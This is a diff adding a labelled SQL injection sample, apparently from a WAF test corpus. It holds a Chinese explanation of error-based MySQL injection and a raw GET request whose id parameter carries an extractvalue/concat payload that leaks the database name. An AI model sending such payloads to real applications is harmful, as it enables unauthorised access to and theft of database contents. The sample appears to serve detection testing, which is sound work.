@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入-06506232
+# 基于报错注入,该SQL注入语句的攻击手法是通过错误的盲注方式，使用MySQL的extractvalue函数获取数据库名称。该sql注入语句中，extractvalue函数接受两个参数，第一个参数表示目标索引，第二个参数是构造的XPath表达式。攻击者使用concat函数将波浪符（0x7e）与数据库名称进行连接，从而构造出一个XPath表达式，以提取当前数据库的名称。攻击目的是通过注入恶意的SQL代码来绕过应用程序的输入验证和过滤机制，从而执行恶意操作，如窃取敏感数据、修改数据或破坏数据库。
+GET /?id=1%20and%20extractvalue%281%2Cconcat%280x7e%2C%28select%20database%28%29%29%2C0x7e%29%29&bid=hd_tag_m8mv24f3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24f3
+RM-PRO-Token: 37453dc1854f8168fa9680f24fd6d126
+RM-PRO-Time: 1742808379289
+User-Agent: curl/7.83.1
+
